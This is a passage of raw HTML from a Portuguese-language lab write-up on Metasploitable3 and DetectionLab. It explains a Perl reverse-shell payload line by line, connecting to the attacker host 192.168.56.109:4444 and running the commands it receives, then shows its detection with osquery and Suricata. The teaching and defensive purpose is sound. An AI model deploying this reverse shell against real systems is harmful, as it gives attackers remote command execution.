2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Payload malicioso&quot;}</p><ol><li>Esse payload cria um fork (processo filho);</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$p=fork;exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="2"><li>Manipula as variáveis de ambiente;</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">if($p);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  foreach my $key(keys %ENV){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if($ENV{$key}=~/(.*)/){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ENV{$key}=$1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="3"><li>Cria uma variável <code>$c</code>, que cria um socket de rede com o Kali;</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$c=new IO::Socket::INET(PeerAddr,&quot;192.168.56.109:4444&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol start="4"><li>O fork le a entrada(<code>STDIN</code>) que digitar-mos, e escreve a saída (<code>$~</code>) no socket <code>$c</code> por meio de um redirecionamento, isso tudo em looping, fazendo parecer um shell interativo.</li></ol><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">STDIN-&gt;fdopen($c,r);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$~-&gt;fdopen($c,w);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while(&lt;&gt;){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($_=~ /(.*)/){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  system $1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><blockquote><p>Pelo o que entendi, esses if&#x27;s (<code>if($_=~ /(.*)/)</code>) são como uma proteção contra script kiddies, ou apenas para redução de possíveis danos maiores. Eles removem a possibilidade de uso de caracteres maliciosos (caracteres de escape e controle), pois com eles, o estrago pode ser muito maior pelo jeito. Mas atacantes sofisticados podem remover essas proteções.
{: .prompt-info}</p></blockquote><p>Essa parte achei bem interessante, da pra diferenciar o tipo de atacante só pelo payload!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-kernel-exploit-download---splunk">Detecting Kernel Exploit Download - Splunk<a href="#detecting-kernel-exploit-download---splunk" class="hash-link" aria-label="Direct link to Detecting Kernel Exploit Download - Splunk" title="Direct link to Detecting Kernel Exploit Download - Splunk">​</a></h3><p>Agora que sabemos que o servidor foi ownado podemos ver se ele fez requisições para outros servidores.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> process_open_sockets </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> remote_address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">&#x27;192.168.56.109&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" alt="wget.png" src="/en/assets/images/wget-7d28e70d48569128f63fa91006bf6134.png" width="1170" height="596" class="img_ev3q"></p><p>Pelos logs do suricata, conseguimos pegar a requisição originada pelo servidor para o servidor malicioso, que foi usada para fazer o download do malware.  </p><p>Esse foi apenas um exemplo de várias das possibilidades com esse laboratório.</p><h1>Referencias</h1><ul><li><a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">https://detectionlab.network</a></li><li><a href="https://docs.nxlog.co/userguide/configure/index.html" target="_blank" rel="noopener noreferrer">https://docs.nxlog.co/userguide/configure/index.html</a></li><li><a href="https://osquery.readthedocs.io/en/latest/" target="_blank" rel="noopener noreferrer">https://osquery.readthedocs.io/en/latest/</a></li><li><a href="https://github.com/rapid7/metasploitable3/" target="_blank" rel="noopener noreferrer">https://github.com/rapid7/metasploitable3/</a></li></ul><p><em>[SO]<!-- -->:&quot;Sistema Operacional&quot;
</em>[dropo]<!-- -->: &quot;Do ingles, drop, derrubar&quot;</p></div><footer class="row docusaurus-mt-lg blogPostFooterDetailsFull_mRVl"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/en/blog/tags/pratica">prática</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/en/blog/tags/tutorial">tutorial</a></li></ul></div><div class="col margin-top--sm"><a href="https://github.com/imgodes/imgodes.github.io/blob/main/website/blog/meta-detec/2023-04-27-metasploitable3-detectionlab.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--next" href="/en/blog/2023/04/23/rev-vmwin10/vms-para-eng-rev"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">Máquinas virtuais para engenharia reversa (Windows)</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#combo---metasploitable3--detectionlab" class="table-of-contents__link toc-highlight">Combo - Metasploitable3 &amp; DetectionLab</a></li><li><a href="#instalação" class="table-of-contents__link toc-highlight">Instalação</a></li><li><a href="#acessos" class="table-of-contents__link toc-highlight">Acessos</a></li><li><a href="#osquery-e-fleet" class="table-of-contents__link toc-highlight">OSQuery e Fleet</a></li><li><a href="#nxlog" class="table-of-contents__link toc-highlight">NXLog</a><ul><li><a href="#nxlog-input" class="table-of-contents__link toc-highlight">NXLog Input</a></li><li><a href="#nxlog-output" class="table-of-contents__link toc-highlight">NXLog Output</a></li></ul></li><li><a href="#splunk" class="table-of-contents__link toc-highlight">Splunk</a><ul><li><a href="#index" class="table-of-contents__link toc-highlight">Index</a></li></ul></li><li><a href="#scanning" class="table-of-contents__link toc-highlight">Scanning</a></li><li><a href="#exploiting" class="table-of-contents__link toc-highlight">Exploiting</a></li><li><a href="#detecting-scan" class="table-of-contents__link toc-highlight">Detecting Scan</a><ul><li><a href="#detecting-scan---suricata" class="table-of-contents__link toc-highlight">Detecting Scan - Suricata</a></li><li><a href="#detecting-scan---zeek" class="table-of-contents__link toc-highlight">Detecting Scan - Zeek</a></li></ul></li><li><a href="#detecting-exploit" class="table-of-contents__link toc-highlight">Detecting Exploit</a><ul><li><a href="#detecting-proftp-exploit---splunk" class="table-of-contents__link toc-highlight">Detecting ProFTP Exploit - Splunk</a></li><li><a href="#detecting-proftp-exploit---osquery" class="table-of-contents__link toc-highlight">Detecting ProFTP Exploit - OSQuery</a></li><li><a href="#detecting-kernel-exploit-download---splunk" class="table-of-contents__link toc-highlight">Detecting Kernel Exploit Download - Splunk</a></li></ul></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Content</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/en/docs/intro">Hunt</a></li><li class="footer__item"><a class="footer__link-item" href="/en/blog">Blog</a></li></ul></div><div class="col footer__col"><div class="footer__title">Contato</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://discord.com/channels/gabreell" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Mais</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/imgodes" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 Security Stuff.</div></div></div></footer></div>
<script src="/en/assets/js/runtime~main.8c10b57e.js"></script>
<script src="/en/assets/js/main.3391b9d5.js"></script>
</body>
</html>